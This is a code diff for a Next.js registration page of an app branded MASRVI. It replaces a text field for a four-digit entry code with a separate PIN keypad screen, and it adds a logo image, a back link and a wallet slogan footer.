@@ -1,9 +1,12 @@
 import { useState } from 'react';
 import Head from 'next/head';
+import Link from 'next/link';
+import Image from 'next/image';
 import { useRouter } from 'next/router';
 import { useTranslation } from 'react-i18next';
 import axios from 'axios';
 import ErrorModal from '@/components/ErrorModal';
+import PinKeypad from '@/components/PinKeypad';
 import { useContest } from '@/context/ContestContext';
 
 export default function RegisterPage() {
@@ -14,19 +17,21 @@ export default function RegisterPage() {
   const [entryCode, setEntryCode] = useState('');
   const [loading, setLoading] = useState(false);
   const [showError, setShowError] = useState(false);
+  const [showPinPad, setShowPinPad] = useState(false);
 
   const handlePhoneChange = (e) => {
     const value = e.target.value.replace(/\D/g, '').slice(0, 8);
     setPhone(value);
   };
 
-  const handleCodeChange = (e) => {
-    const value = e.target.value.replace(/\D/g, '').slice(0, 4);
-    setEntryCode(value);
+  const handlePinChange = (newValue) => {
+    setEntryCode(newValue);
   };
 
   const handleSubmit = async (e) => {
-    e.preventDefault();
+    if (e) e.preventDefault();
+    if (phone.length < 8 || entryCode.length < 4) return;
+    
     setLoading(true);
 
     try {
@@ -45,66 +50,178 @@ export default function RegisterPage() {
     }
   };
 
+  // Show PIN keypad screen
+  if (showPinPad) {
+    return (
+      <>
+        <Head>
+          <title>MASRVI - {t('registration.password_label')}</title>
+        </Head>
+
+        <main className="min-h-screen flex flex-col bg-gray-50 transition-colors">
+          {/* Back Button */}
+          <div className="px-4 py-4">
+            <button
+              onClick={() => setShowPinPad(false)}
+              className="inline-flex items-center gap-2 text-gray-700 hover:text-primary-700 transition-colors text-base"
+            >
+              <span className="rtl:rotate-180">&#10094;</span>
+              <span>{t('registration.back')}</span>
+            </button>
+          </div>
+
+          <div className="flex-1 flex flex-col items-center justify-center px-4">
+            {/* PIN Keypad */}
+            <div className="w-full max-w-sm animate-fade-in-up">
+              <PinKeypad
+                value={entryCode}
+                onChange={handlePinChange}
+                maxLength={4}
+                instruction={t('registration.enter_pin_instruction')}
+              />
+            </div>
+
+            {/* Submit button when PIN is complete */}
+            {entryCode.length === 4 && (
+              <button
+                onClick={handleSubmit}
+                disabled={loading}
+                className="mt-8 w-full max-w-xs py-4 bg-primary-500 hover:bg-primary-600 disabled:opacity-50 text-white font-bold rounded-2xl transition-all shadow-lg text-base animate-fade-in-up btn-primary"
+              >
+                {loading ? (
+                  <span className="flex items-center justify-center gap-2">
+                    <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                  </span>
+                ) : t('registration.submit')}
+              </button>
+            )}
+          </div>
+        </main>
+
+        <ErrorModal
+          isOpen={showError}
+          title={t('errors.title')}
+          message={t('errors.invalid_registration')}
+          buttonText={t('errors.retry')}
+          onClose={() => setShowError(false)}
+        />
+      </>
+    );
+  }
+
+  // Main registration form
   return (
     <>
       <Head>
-        <title>{t('registration.submit')}</title>
+        <title>MASRVI - {t('registration.submit')}</title>
       </Head>
 
-      <main className="min-h-[calc(100vh-64px)] flex items-center justify-center px-4 py-12">
-        <div className="w-full max-w-md">
-          <div className="bg-white rounded-3xl shadow-xl border border-gray-100 p-8">
-            <div className="text-center mb-8">
-              <div className="w-16 h-16 mx-auto mb-4 rounded-2xl bg-primary-100 flex items-center justify-center text-3xl">
-                📝
+      <main className="min-h-screen flex flex-col bg-gradient-to-br from-primary-50 via-white to-primary-100 transition-colors">
+        {/* Back Button */}
+        <div className="px-4 py-3 md:py-4">
+          <Link
+            href="/"
+            className="inline-flex items-center gap-2 text-gray-600 hover:text-primary-700 transition-colors text-sm md:text-base"
+          >
+            <span className="rtl:rotate-180">&#10094;</span>
+            <span>{t('registration.back')}</span>
+          </Link>
+        </div>
+
+        <div className="flex-1 flex items-center justify-center px-4 py-4 md:py-8">
+          <div className="w-full max-w-md animate-fade-in-up">
+            <div className="glass-card rounded-2xl md:rounded-3xl p-6 md:p-8">
+              {/* Logo - Bigger */}
+              <div className="text-center mb-6 md:mb-8">
+                <Image
+                  src="https://hebbkx1anhila5yf.public.blob.vercel-storage.com/7923244c-5be4-4f29-bbe9-96c23ebaebc9.jpeg"
+                  alt="Masrvi Logo"
+                  width={180}
+                  height={72}
+                  className="h-16 md:h-20 w-auto mx-auto mb-4 object-contain"
+                />
+                <h1 className="text-xl md:text-2xl font-bold text-gray-800">{t('registration.submit')}</h1>
               </div>
-              <h1 className="text-2xl font-bold text-gray-900">{t('registration.submit')}</h1>
+
+              <div className="space-y-5 md:space-y-6">
+                {/* Phone Input */}
+                <div className="animate-fade-in-up stagger-1">
+                  <label htmlFor="phone" className="block text-sm font-semibold text-gray-800 mb-2 text-right">
+                    {t('registration.phone_label')}
+                  </label>
+                  <div className="flex gap-2">
+                    <div className="flex items-center px-4 py-3 md:py-4 glass-input rounded-xl text-primary-700 font-bold text-base md:text-lg">
+                      222
+                    </div>
+                    <input
+                      id="phone"
+                      type="tel"
+                      inputMode="numeric"
+                      maxLength={8}
+                      value={phone}
+                      onChange={handlePhoneChange}
+                      className="flex-1 px-4 py-3 md:py-4 glass-input rounded-xl focus:outline-none transition ltr-input text-base md:text-lg font-medium"
+                      required
+                    />
+                  </div>
+                </div>
+
+                {/* Password - Click to show PIN pad */}
+                <div className="animate-fade-in-up stagger-2">
+                  <label className="block text-sm font-semibold text-gray-800 mb-2 text-right">
+                    {t('registration.password_label')}
+                  </label>
+                  <button
+                    type="button"
+                    onClick={() => phone.length >= 8 && setShowPinPad(true)}
+                    disabled={phone.length < 8}
+                    className="w-full px-4 py-3 md:py-4 glass-input rounded-xl text-right flex items-center justify-between disabled:opacity-50 disabled:cursor-not-allowed transition-all hover:border-primary-400"
+                  >
+                    <span className="flex gap-2">
+                      {entryCode ? (
+                        [...Array(4)].map((_, i) => (
+                          <span
+                            key={i}
+                            className={`w-3 h-3 rounded-full transition-colors ${
+                              i < entryCode.length ? 'bg-primary-500' : 'bg-gray-300'
+                            }`}
+                          />
+                        ))
+                      ) : (
+                        <span className="text-gray-400 text-sm">{phone.length < 8 ? t('registration.enter_phone_first') : ''}</span>
+                      )}
+                    </span>
+                    <svg className="w-5 h-5 text-gray-400 rtl:rotate-180" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
+                    </svg>
+                  </button>
+                </div>
+
+                {/* Submit Button */}
+                <div className="pt-2 md:pt-4 animate-fade-in-up stagger-3">
+                  <button
+                    type="button"
+                    onClick={handleSubmit}
+                    disabled={loading || phone.length < 8 || entryCode.length < 4}
+                    className="w-full py-4 md:py-5 bg-primary-500 hover:bg-primary-600 disabled:opacity-50 disabled:cursor-not-allowed text-white font-bold rounded-2xl transition-all shadow-lg text-base md:text-lg btn-primary"
+                  >
+                    {loading ? (
+                      <span className="flex items-center justify-center gap-2">
+                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+                      </span>
+                    ) : t('registration.submit')}
+                  </button>
+                </div>
+              </div>
             </div>
-
-            <form onSubmit={handleSubmit} className="space-y-6">
-              <div>
-                <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-2">
-                  {t('registration.phone_label')}
-                </label>
-                <input
-                  id="phone"
-                  type="tel"
-                  inputMode="numeric"
-                  maxLength={8}
-                  value={phone}
-                  onChange={handlePhoneChange}
-                  placeholder={t('registration.phone_placeholder')}
-                  className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-primary-500 focus:border-primary-500 outline-none transition ltr-input"
-                  required
-                />
-              </div>
-
-              <div>
-                <label htmlFor="entryCode" className="block text-sm font-medium text-gray-700 mb-2">
-                  {t('registration.password_label')}
-                </label>
-                <input
-                  id="entryCode"
-                  type="tel"
-                  inputMode="numeric"
-                  maxLength={4}
-                  value={entryCode}
-                  onChange={handleCodeChange}
-                  placeholder={t('registration.password_placeholder')}
-                  className="w-full px-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-primary-500 focus:border-primary-500 outline-none transition ltr-input"
-                  required
-                />
-              </div>
-
-              <button
-                type="submit"
-                disabled={loading}
-                className="w-full py-3.5 bg-gradient-to-r from-primary-600 to-primary-700 hover:from-primary-700 hover:to-primary-800 disabled:opacity-60 text-white font-bold rounded-xl transition-all shadow-md"
-              >
-                {loading ? '...' : t('registration.submit')}
-              </button>
-            </form>
           </div>
+        </div>
+
+        {/* Green Bottom Section */}
+        <div className="bg-primary-500 rounded-t-[2rem] py-6 md:py-8 px-4 mt-auto">
+          <p className="text-white text-center text-base md:text-lg font-medium">
+            Mon wallet 100% simple et securise
+          </p>
         </div>
       </main>
 
